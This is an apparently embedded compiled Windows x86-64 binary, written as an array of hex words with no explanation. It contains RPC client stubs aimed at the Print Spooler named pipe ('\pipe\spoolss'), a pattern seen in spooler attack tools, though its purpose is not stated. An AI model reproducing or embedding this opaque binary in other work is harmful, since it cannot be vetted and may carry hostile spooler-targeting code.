0x4848247c, 0x4120c483, 0x07b9c35e, 0xe8000000, 0x000007a0, 0xcccccc90, 0x245c8948, 0x83485708, 0x8a4030ec, 0xd1058bf9, 0x85000043, 0x330d7fc0, 0x5c8b48c0, 0x83484024, 0xc35f30c4, 0x0589c8ff, 0x000043b8, 0x00042fe8, 0x88d88a00, 0x83202444, 0x00493e3d, 0x37750200, 0x000543e8, 0x03e6e800, 0xd5e80000, 0x83000008, 0x00492625, 0xcb8a0000, 0x0006dfe8, 0x40d23300, 0xf9e8cf8a, 0xf6000006, 0x83db1bd8, 0x45e801e3, 0x8b000005, 0xb9a2ebc3, 0x00000007, 0x00071be8, 0xcc909000, 0x48c48b48, 0x4c205889, 0x89184089, 0x89481050, 0x57560848, 0x83485641, 0x8b4940ec, 0x4cfa8bf0, 0xd285f18b, 0x15390f75, 0x00004334, 0xc033077f, 0x0000eee9, 0xff428d00, 0x7701f883, 0x058b4845, 0x000015ac, 0x75c08548, 0x2444c70a, 0x00000130, 0xff14eb00, 0x00153715, 0x89d88b00, 0x85302444, 0xb2840fc0, 0x4c000000, 0xd78bc68b, 0xe8ce8b49, 0xfffffda0, 0x4489d88b, 0xc0853024, 0x0097840f, 0x8b4c0000, 0x49d78bc6, 0x31e8ce8b, 0x8bfffffd, 0x244489d8, 0x01ff8330, 0xc0853675, 0x8b4c3275, 0x49d233c6, 0x15e8ce8b, 0x48fffffd, 0x950ff685, 0xfec6e8c1, 0x8b48ffff, 0x00153305, 0xc0854800, 0x8b4c0e74, 0x49d233c6, 0x15ffce8b, 0x000014c0, 0x0574ff85, 0x7503ff83, 0xc68b4c40, 0x8b49d78b, 0xfd2ee8ce, 0xd88bffff, 0x30244489, 0x2974c085, 0xf9058b48, 0x48000014, 0x0975c085, 0x8901588d, 0xeb30245c, 0xc68b4c14, 0x8b49d78b, 0x7d15ffce, 0x8b000014, 0x244489d8, 0x3306eb30, 0x245c89db, 0x48c38b30, 0x78245c8b, 0x40c48348, 0x5e5f5e41, 0xccccccc3, 0x245c8948, 0x74894808, 0x48571024, 0x4920ec83, 0xda8bf88b, 0x83f18b48, 0x057501fa, 0x00019be8, 0xc78b4c00, 0x8b48d38b, 0x5c8b48ce, 0x8b483024, 0x48382474, 0x5f20c483, 0xfffe8fe9, 0xccccccff, 0x83485340, 0x8b4820ec, 0xffc933d9, 0x0012cb15, 0xcb8b4800, 0x12ca15ff, 0x15ff0000, 0x00001264, 0xbac88b48, 0xc0000409, 0x20c48348, 0x25ff485b, 0x000012a0, 0x244c8948, 0xec834808, 0x0017b938, 0x27e80000, 0x85000009, 0xb90774c0, 0x00000002, 0x8d4829cd, 0x0042430d, 0x00aae800, 0x8b480000, 0x48382444, 0x432a0589, 0x8d480000, 0x48382444, 0x4808c083, 0x42ba0589, 0x8b480000, 0x00431305, 0x05894800, 0x00004184, 0x24448b48, 0x05894840, 0x00004288, 0x415e05c7, 0x04090000, 0x05c7c000, 0x00004158, 0x00000001, 0x416205c7, 0x00010000, 0x08b80000, 0x48000000, 0x4800c06b, 0x415a0d8d, 0xc7480000, 0x00020104, 0x08b80000, 0x48000000, 0x4800c06b, 0x40da0d8b, 0x89480000, 0xb820044c, 0x00000008, 0x01c06b48, 0xbd0d8b48, 0x48000040, 0x20044c89, 0x890d8d48, 0xe8000013, 0xffffff00, 0x38c48348, 0xccccccc3, 0x57565340, 0x40ec8348, 0xffd98b48, 0x0011e315, 0xb38b4800, 0x000000f8, 0x3345ff33, 0x548d48c0, 0x8b486024, 0xc115ffce, 0x48000011, 0x3974c085, 0x24648348, 0x8d480038, 0x4868244c, 0x6024548b, 0x48c88b4c, 0x30244c89, 0x48c68b4c, 0x70244c8d, 0x244c8948, 0x48c93328, 0x20245c89, 0x118215ff, 0xc7ff0000, 0x7c02ff83, 0xc48348b1, 0x5b5e5f40, 0xccccccc3, 0x245c8948, 0x8b485520, 0xec8348ec, 0x058b4820, 0x00004024, 0xa232bb48, 0x2b992ddf, 0x3b480000, 0x487475c3, 0x00186583, 0x184d8d48, 0x10fe15ff, 0x8b480000, 0x89481845, 0x15ff1045, 0x000010f8, 0x3148c08b, 0x15ff1045, 0x000010f4, 0x8d48c08b, 0x3148204d, 0x15ff1045, 0x000010ec, 0x4820458b, 0x48104d8d, 0x4820e0c1, 0x48204533, 0x48104533, 0xb948c133, 0xffffffff, 0x0000ffff, 0x48c12348, 0xdfa233b9, 0x002b992d, 0xc33b4800, 0xc1440f48, 0xa1058948, 0x4800003f, 0x48245c8b, 0x48d0f748, 0x3f8a0589, 0x83480000, 0xc35d20c4, 0x3d0d8d48, 0x48000045, 0x106e25ff, 0xcccc0000, 0x2d0d8d48, 0xe9000045, 0x000006ee, 0x31058d48, 0xc3000045, 0x28ec8348, 0xfff057e8, 0x088348ff, 0xffe6e824, 0x8348ffff, 0x83480208, 0xccc328c4, 0x28ec8348, 0x0006a7e8, 0x74c08500, 0x8b486521, 0x00302504, 0x8b480000, 0x05eb0848, 0x74c83b48, 0xf0c03314, 0x0db10f48, 0x000044f8, 0xc032ee75, 0x28c48348, 0xeb01b0c3, 0xccccccf7, 0x28ec8348, 0x00066be8, 0x74c08500, 0x04b6e807, 0x19eb0000, 0x000653e8, 0xe8c88b00, 0x0000068c, 0x0474c085, 0x07ebc032, 0x000685e8, 0x4801b000, 0xc328c483, 0x28ec8348, 0x3de8c933, 0x84000001, 0xc0950fc0, 0x28c48348, 0xccccccc3, 0x28ec8348, 0x00067be8, 0x75c08400, 0xebc03204, 0x066ee812, 0xc0840000, 0x65e80775, 0xeb000006, 0x4801b0ec, 0xc328c483, 0x28ec8348, 0x000653e8, 0x064ee800, 0x01b00000, 0x28c48348, 0xccccccc3, 0x245c8948, 0x6c894808, 0x89481024, 0x57182474, 0x20ec8348, 0x49f98b49, 0xda8bf08b, 0xe8e98b48, 0x000005c4, 0x1675c085, 0x7501fb83, 0xc68b4c11, 0x8b48d233, 0xc78b48cd, 0x10ae15ff, 0x8b480000, 0x8b582454, 0x4850244c, 0x30245c8b, 0x246c8b48, 0x748b4838, 0x83484024, 0xe95f20c4, 0x000005ba, 0x28ec8348, 0x00057fe8, 0x74c08500, 0x0d8d4810, 0x000043f8, 0x28c48348, 0x0005b5e9, 0x05c6e800, 0xc0850000, 0xade80575, 0x48000005, 0xc328c483, 0x28ec8348, 0xa9e8c933, 0x48000005, 0xe928c483, 0x000005a0, 0x83485340, 0xb60f20ec, 0x0043b305, 0xbbc98500, 0x00000001, 0x88c3440f, 0x0043a305, 0x0376e800, 0x79e80000, 0x84000005, 0x320475c0, 0xe814ebc0, 0x0000056c, 0x0975c084, 0x61e8c933, 0xeb000005, 0x48c38aea, 0x5b20c483, 0xccccccc3, 0x83485340, 0x3d8020ec, 0x00004368, 0x75d98b00, 0x01f98367, 0xdde86a77, 0x85000004, 0x852874c0, 0x482475db, 0x43520d8d, 0x0de80000, 0x85000005, 0x481075c0, 0x435a0d8d, 0xfde80000, 0x85000004, 0x322e74c0, 0x6633ebc0, 0x2d056f0f, 0x48000010, 0xf3ffc883, 0x21057f0f, 0x48000043, 0x432a0589, 0x0ff30000, 0x432a057f, 0x89480000, 0x00433305, 0xfd05c600, 0x01000042, 0x834801b0, 0xc35b20c4, 0x000005b9, 0x00fae800, 0xcccc0000, 0x18ec8348, 0xb8c18b4c, 0x00005a4d, 0xed053966, 0x75ffffdc, 0x0d634878, 0xffffdd20, 0xdd158d48, 0x48ffffdc, 0x3981ca03, 0x00004550, 0x0bb85f75, 0x66000002, 0x75184139, 0xc22b4c54, 0x1441b70f, 0x18518d48, 0x0fd00348, 0x480641b7, 0x4c800c8d, 0x48ca0c8d, 0x49241489, 0x1874d13b, 0x4c0c4a8b, 0x0a72c13b, 0x0308428b, 0xc03b4cc1, 0x83480872, 0xdfeb28c2, 0x8548d233, 0x320475d2, 0x8314ebc0, 0x7d00247a, 0xebc03204, 0xeb01b00a, 0xebc03206, 0x48c03202, 0xc318c483, 0x83485340, 0xd98a20ec, 0x0003c7e8, 0x85d23300, 0x840b74c0, 0x480775db, 0x422a1587, 0x83480000, 0xc35b20c4, 0x83485340, 0x3d8020ec, 0x0000421f, 0x74d98a00, 0x75d28404, 0x03f2e80c, 0xcb8a0000, 0x0003ebe8, 0x4801b000, 0x5b20c483, 0xccccccc3, 0x51058d48, 0xc3000042, 0x42292583, 0xc3000000, 0x245c8948, 0x8d485508, 0xfb4024ac, 0x8148ffff, 0x0005c0ec, 0xb9d98b00, 0x00000017, 0x0003a9e8, 0x74c08500, 0xcdcb8b04, 0x0003b929, 0xc5e80000, 0x33ffffff, 0x4d8d48d2, 0xd0b841f0, 0xe8000004, 0x00000350, 0xf04d8d48, 0x0d0a15ff, 0x8b480000, 0x0000e89d, 0x958d4800, 0x000004d8, 0x45cb8b48, 0x15ffc033, 0x00000ce8, 0x74c08548, 0x6483483c, 0x48003824, 0x04e08d8d, 0x8b480000, 0x0004d895, 0xc88b4c00, 0x244c8948, 0xc38b4c30, 0xe88d8d48, 0x48000004, 0x28244c89, 0xf04d8d48, 0x244c8948, 0xffc93320, 0x000c9f15, 0x858b4800, 0x000004c8, 0x244c8d48, 0x85894850, 0x000000e8, 0x8d48d233, 0x0004c885, 0x98b84100, 0x48000000, 0x4808c083, 0x00888589, 0xb9e80000, 0x48000002, 0x04c8858b, 0x89480000, 0xc7602444, 0x15502444, 0xc7400000, 0x01542444, 0xff000000, 0x000bfb15, 0x01f88300, 0x24448d48, 0x44894850, 0x8d484024, 0x940ff045, 0x448948c3, 0xc9334824, 0x0c1a15ff, 0x8d480000, 0xff40244c, 0x000c1715, 0x75c08500, 0x75db840c, 0x03488d08, 0xfffebfe8, 0x9c8b48ff, 0x0005d024, 0xc4814800, 0x000005c0, 0xccccc35d, 0x245c8948, 0x83485708, 0x8d4820ec, 0x00266b1d, 0x3d8d4800, 0x00002664, 0x8b4812eb, 0xc0854803, 0x15ff0674, 0x00000d04, 0x08c38348, 0x72df3b48, 0x5c8b48e9, 0x83483024, 0xc35f20c4, 0x245c8948, 0x83485708, 0x8d4820ec, 0x00263f1d, 0x3d8d4800, 0x00002638, 0x8b4812eb, 0xc0854803, 0x15ff0674, 0x00000cc8, 0x08c38348, 0x72df3b48, 0x5c8b48e9, 0x83483024, 0xc35f20c4, 0xcc0000c2, 0x245c8948, 0x74894810, 0x48571824, 0x3310ec83, 0x0fc933c0, 0xc18b44a2, 0x44db3345, 0x8141cb8b, 0x65746ef0, 0xf181416c, 0x756e6547, 0x8bd28b44, 0x41c933f0, 0x4501438d, 0xa20fc80b, 0x69f28141, 0x8949656e, 0x0b452404, 0x245c89ca, 0x89f98b04, 0x8908244c, 0x750c2454, 0x0d834850, 0x000039ff, 0x3ff025ff, 0xc03d0fff, 0x74000106, 0x06603d28, 0x21740002, 0x0206703d, 0x051a7400, 0xfffcf9b0, 0x7720f883, 0x01b94824, 0x01000100, 0x48000000, 0x73c1a30f, 0x058b4414, 0x00003fd4, 0x01c88341, 0xc9058944, 0xeb00003f, 0x058b4407, 0x00003fc0, 0x000007b8, 0x488d4400, 0x7cf03bfb, 0x0fc93326, 0x240489a2, 0x89db8b44, 0x8904245c, 0x8908244c, 0x0f0c2454, 0x7309e3ba, 0xc10b450a, 0x8d058944, 0xc700003f, 0x00396b05, 0x00000100, 0x0d894400, 0x00003968, 0x14e7ba0f, 0x0091830f, 0x89440000, 0x0039530d, 0x0006bb00, 0x1d890000, 0x0000394c, 0x1be7ba0f, 0xba0f7973, 0x73731ce7, 0x010fc933, 0xe2c148d0, 0xd00b4820, 0x24548948, 0x448b4820, 0xc3222024, 0x5775c33a, 0x391e058b, 0xc8830000, 0x0d05c708, 0x03000039, 0x89000000, 0x00390b05, 0xc3f64100, 0x83387420, 0x05c720c8, 0x000038f4, 0x00000005, 0x38f20589, 0x00b80000, 0x44d00300, 0x3b44d823, 0x481875d8, 0x2024448b, 0xe03ce024, 0x0d830d75, 0x000038d3, 0xc91d8940, 0x48000038, 0x28245c8b, 0x8b48c033, 0x48302474, 0x5f10c483, 0xccccccc3, 0x000001b8, 0xccccc300, 0x0539c033, 0x000038bc, 0xc3c0950f, 0xcccccccc, 0xcccccccc, 0x0a3a25ff, 0x25ff0000, 0x00000a3c, 0x0a2625ff, 0x25ff0000, 0x00000a88, 0x0a7a25ff, 0x25ff0000, 0x00000a6c, 0x0a5e25ff, 0x25ff0000, 0x00000a50, 0x0a4225ff, 0x25ff0000, 0x00000a34, 0x0a6625ff, 0x25ff0000, 0x00000958, 0xccc301b0, 0xccc3c033, 0x28ec8348, 0x38418b4d, 0x49ca8b48, 0x0de8d18b, 0xb8000000, 0x00000001, 0x28c48348, 0xccccccc3, 0x8b455340, 0xda8b4818, 0xf8e38341, 0x41c98b4c, 0x4c0400f6, 0x1374d18b, 0x08408b41, 0x0450634d, 0x034cd8f7, 0xc86348d1, 0x49d1234c, 0x8b4ac363, 0x8b481014, 0x488b1043, 0x438b4808, 0x0144f608, 0x0b740f03, 0x0144b60f, 0xf0e08303, 0x4cc8034c, 0x8b49ca33, 0x85e95bc9, 0xccfffff2, 0x48c48b48, 0x48085889, 0x48106889, 0x48187089, 0x41207889, 0xec834856, 0x518b4d20, 0xf28b4838, 0x48f08b4d, 0x8b49e98b, 0xce8b48d1, 0x41f98b49, 0xc1481a8b, 0x034904e3, 0x438d4cda, 0xff62e804, 0x458bffff, 0xf6662404, 0x0001b8d8, 0xd21b0000, 0xd003daf7, 0x74045385, 0xcf8b4c11, 0x48c68b4d, 0x8b48d68b, 0xfecae8cd, 0x8b48ffff, 0x4830245c, 0x38246c8b, 0x24748b48, 0x7c8b4840, 0x83484824, 0x5e4120c4, 0xccccccc3, 0xcccccccc, 0xcccccccc, 0xcccccccc, 0xcccccccc, 0x6666cccc, 0x00841f0f, 0x00000000, 0xcccce0ff, 0xcccccccc, 0xcccccccc, 0xcccccccc, 0xcccccccc, 0x6666cccc, 0x00841f0f, 0x00000000, 0x095a25ff, 0x55400000, 0x20ec8348, 0x8aea8b48, 0x8348404d, 0xe95d20c4, 0xfffffa6c, 0x485540cc, 0x4820ec83, 0x4d8aea8b, 0xfa5ae820, 0x4890ffff, 0x5d20c483, 0x5540ccc3, 0x20ec8348, 0x48ea8b48, 0x5d20c483, 0xfff8bbe9, 0x5540ccff, 0x30ec8348, 0x48ea8b48, 0x108b018b, 0x244c8948, 0x24548928, 0x0d8d4c20, 0xfffff17c, 0x70458b4c, 0x4868558b, 0xe8604d8b, 0xfffff7fc, 0xc4834890, 0xccc35d30, 0x8b485540, 0x018b48ea, 0x3881c933, 0xc0000005, 0x8bc1940f, 0xccc35dc1, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00005492, 0x00000000, 0x00005482, 0x00000000, 0x0000546c, 0x00000000, 0x00005454, 0x00000000, 0x0000543a, 0x00000000, 0x00005426, 0x00000000, 0x00005408, 0x00000000, 0x000053e8, 0x00000000, 0x000053d0, 0x00000000, 0x00005398, 0x00000000, 0x00005384, 0x00000000, 0x00005372, 0x00000000, 0x0000535c, 0x00000000, 0x00000000, 0x00000000, 0x00005328, 0x00000000, 0x00005314, 0x00000000, 0x00005308, 0x00000000, 0x000052f8, 0x00000000, 0x000052ea, 0x00000000, 0x000052dc, 0x00000000, 0x000052c8, 0x00000000, 0x000052b8, 0x00000000, 0x000052b0, 0x00000000, 0x000052a0, 0x00000000, 0x0000528a, 0x00000000, 0x00005274, 0x00000000, 0x00005260, 0x00000000, 0x0000524c, 0x00000000, 0x0000533a, 0x00000000, 0x00005240, 0x00000000, 0x0000587c, 0x00000000, 0x00005866, 0x00000000, 0x0000584c, 0x00000000, 0x00005836, 0x00000000, 0x00005820, 0x00000000, 0x00005806, 0x00000000, 0x000057ea, 0x00000000, 0x000057d6, 0x00000000, 0x000057b8, 0x00000000, 0x0000579c, 0x00000000, 0x00005788, 0x00000000, 0x0000576e, 0x00000000, 0x0000575a, 0x00000000, 0x00000000, 0x00000000, 0x0000553a, 0x00000000, 0x00005518, 0x00000000, 0x000054b8, 0x00000000, 0x000054ca, 0x00000000, 0x000054ea, 0x00000000, 0x00005506, 0x00000000, 0x0000552a, 0x00000000, 0x00000000, 0x00000000, 0x0000556e, 0x00000000, 0x00005554, 0x00000000, 0x00000000, 0x00000000, 0x000055cc, 0x00000000, 0x00005594, 0x00000000, 0x000055ac, 0x00000000, 0x00000000, 0x00000000, 0x000055e8, 0x00000000, 0x000055f0, 0x00000000, 0x00000000, 0x00000000, 0x000056b4, 0x00000000, 0x00005698, 0x00000000, 0x00005676, 0x00000000, 0x0000565c, 0x00000000, 0x0000564a, 0x00000000, 0x0000563c, 0x00000000, 0x00005630, 0x00000000, 0x000056cc, 0x00000000, 0x00000000, 0x00000000, 0x00005612, 0x00000000, 0x00000000, 0x00000000, 0x00005606, 0x00000000, 0x000055fa, 0x00000000, 0x00000000, 0x00000000, 0x800025bc, 0x00000001, 0x800025bc, 0x00000001, 0x800028f0, 0x00000001, 0x80002910, 0x00000001, 0x80002910, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x80006050, 0x00000001, 0x800060f0, 0x00000001, 0x00000000, 0x00000000, 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff, 0x6361636e, 0x706e5f6e, 0x00000000, 0x00000000, 0x7069705c, 0x70735c65, 0x736c6f6f, 0x00000073, 0x01080040, 0x00000010, 0x00000000, 0x00000008, 0x00000000, 0x00080001, 0x00000072, 0x00000000, 0x80003369, 0x00000001, 0x000000f0, 0x00000008, 0x80003300, 0x00000001, 0x80003310, 0x00000001, 0x00004170, 0x0000e170, 0x00040502, 0x00000000, 0x00000000, 0x5c250812, 0x00020411, 0x0000a030, 0x000e0011, 0x0001001b, 0x00000019, 0x5b010001, 0x0010031a, 0x00060000, 0x5b364008, 0xffe62012, 0x00020411, 0x0000e130, 0x00004130, 0x00380012, 0x0002011b, 0x000c0019, 0x5b060001, 0x0018031a, 0x000a0000, 0x08080606, 0x5b5c3608, 0xffe22012, 0x00000321, 0x00080019, 0xffff0001, 0x0000ffff, 0xffda004c, 0x031a5b5c, 0x00000018, 0x08080008, 0x5b364008, 0xffda2012, 0x00000000, 0x00000000, 0x012c0040, 0x00000030, 0x00000008, 0x00000044, 0x00000000, 0x00080006, 0x00000071, 0x00000800, 0x800043a0, 0x00000001, 0x0000000b, 0x00000000, 0x800037b4, 0x00000001, 0x00000110, 0x00000008, 0x800043a0, 0x00000001, 0x0000000b, 0x00000010, 0x80003490, 0x00000001, 0x0000010b, 0x00000018, 0x80003369, 0x00000001, 0x000000c8, 0x00000020, 0x80003369, 0x00000001, 0x000000f0, 0x00000028, 0x00000001, 0x00000603, 0x00000000, 0x00000000, 0x00030735, 0x00000010, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x800037b8, 0x00000001, 0x00000005, 0x00000000, 0x00040090, 0x00000000, 0x00000014, 0x00000000, 0x00000093, 0x00000000, 0x80003320, 0x00000001, 0x80003400, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x800044f0, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x800037d8, 0x00000001, 0x800037d8, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x800037d8, 0x00000001, 0x800037d8, 0x00000001, 0x800037d8, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x800037d8, 0x00000001, 0x800037d8, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x800037d8, 0x00000001, 0x800037d8, 0x00000001, 0x80003320, 0x00000001, 0x800037d8, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x80003320, 0x00000001, 0x800037d8, 0x00000001, 0x800037d8, 0x00000001, 0x800043e0, 0x00000001, 0x00002021, 0x00000000, 0x80004480, 0x00000001, 0x800041f0, 0x00000001, 0x80003802, 0x00000001, 0x80003720, 0x00000001, 0x800041d0, 0x00000001, 0x00000002, 0x00000000, 0x80004300, 0x00000001, 0x00240000, 0x008c0068, 0x00d400b0, 0x011c00f8, 0x01640140, 0x01ac0188, 0x01f401d0, 0x023c0218, 0x02840260, 0x02cc02a8, 0x031402f0, 0x035c0338, 0x03a40380, 0x03ec03c8, 0x04340410, 0x04840460, 0x04cc04a8, 0x051404f0, 0x055c0538, 0x0598057a, 0x05e005bc, 0x06280604, 0x06640646, 0x06a60682, 0x06ee06ca, 0x072a070c, 0x0772074e, 0x07b40796, 0x07f607d2, 0x08380814, 0x0880085c, 0x08c808a4, 0x090408e6, 0x00020064, 0x00000001, 0x00000603, 0x00000008, 0x0000a070, 0x00002021, 0x00000000, 0x800044d0, 0x00000001, 0x00000001, 0x00000603, 0x0000000c, 0x00000000, 0x01000040, 0x00000008, 0x00000000, 0x00000000, 0x00000000, 0x00080000, 0x00000072, 0x00000000, 0x00000000, 0x00000000, 0x48000000, 0x00000000, 0x00100000, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x00300001, 0x00000831, 0x00085c00, 0x06460040, 0x0000050a, 0x00000001, 0x000b0000, 0x00020000, 0x00080110, 0x000b000a, 0x00020010, 0x0018010b, 0x0048001e, 0x00080020, 0x00280070, 0x48000008, 0x00000000, 0x00100002, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x00100003, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x00100004, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x00100005, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x00100006, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x00100007, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x00100008, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x00100009, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x0010000a, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x0010000b, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x0010000c, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x0010000d, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x0010000e, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x0010000f, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x00100010, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x00100011, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x00100012, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x00100013, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x00100014, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x00100015, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x00100016, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x00100017, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x00100018, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x00100019, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x0010001a, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x0010001b, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x0010001c, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x0010001d, 0x0000e030, 0x00380000, 0x02440040, 0x0000010a, 0x00000000, 0x01180000, 0x00320000, 0x00080070, 0x48000008, 0x00000000, 0x0010001e, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x0010001f, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x00100020, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x00100021, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x00100022, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x00100023, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x00100024, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x00080025, 0x00000032, 0x00000000, 0x010a0040, 0x00000000, 0x00000000, 0x00004800, 0x00260000, 0x00320008, 0x00000000, 0x00400000, 0x0000010a, 0x00000000, 0x48000000, 0x00000000, 0x00100027, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x00100028, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x00100029, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x0010002a, 0x00000032, 0x00080000, 0x010a0144, 0x00000000, 0x00000000, 0x00080070, 0x48000008, 0x00000000, 0x0008002b, 0x00000032, 0x00000000, 0x010a0040, 0x00000000, 0x00000000, 0x00004800, 0x002c0000, 0x00320008, 0x00000000, 0x00400000, 0x0000010a, 0x00000000, 0x48000000, 0x00000000, 0x0008002d, 0x00000032, 0x00000000, 0x010a0040, 0x00000000, 0x00000000, 0x00004800, 0x002e0000, 0x00320010, 0x00000000, 0x01440008, 0x0000010a, 0x00000000, 0x00700000, 0x00080008, 0x00004800, 0x002f0000, 0x00320010, 0x00000000, 0x01440008, 0x0000010a, 0x00000000, 0x00700000, 0x00080008, 0x00004800, 0x00300000, 0x00320010, 0x00000000, 0x01440008, 0x0000010a, 0x00000000, 0x00700000, 0x00080008, 0x00004800, 0x00310000, 0x00320008, 0x00000000, 0x00400000, 0x0000010a, 0x00000000, 0x48000000, 0x00000000, 0x00080032, 0x00000032, 0x00000000, 0x010a0040, 0x00000000, 0x00000000, 0x00004800, 0x00330000, 0x00320010, 0x00000000, 0x01440008, 0x0000010a, 0x00000000, 0x00700000, 0x00080008, 0x00004800, 0x00340000, 0x00320010, 0x00000000, 0x01440008, 0x0000010a, 0x00000000, 0x00700000, 0x00080008, 0x00004800, 0x00350000, 0x00320010, 0x00000000, 0x01440008, 0x0000010a, 0x00000000, 0x00700000, 0x00080008, 0x00004800, 0x00360000, 0x00320008, 0x00000000, 0x00400000, 0x0000010a, 0x00000000, 0x48000000, 0x00000000, 0x00080037, 0x00000032, 0x00000000, 0x010a0040, 0x00000000, 0x00000000, 0x00004800, 0x00380000, 0x00320010, 0x00000000, 0x01440008, 0x0000010a, 0x00000000, 0x00700000, 0x00080008, 0x00004800, 0x00390000, 0x00320008, 0x00000000, 0x00400000, 0x0000010a, 0x00000000, 0x48000000, 0x00000000, 0x0010003a, 0x00000032, 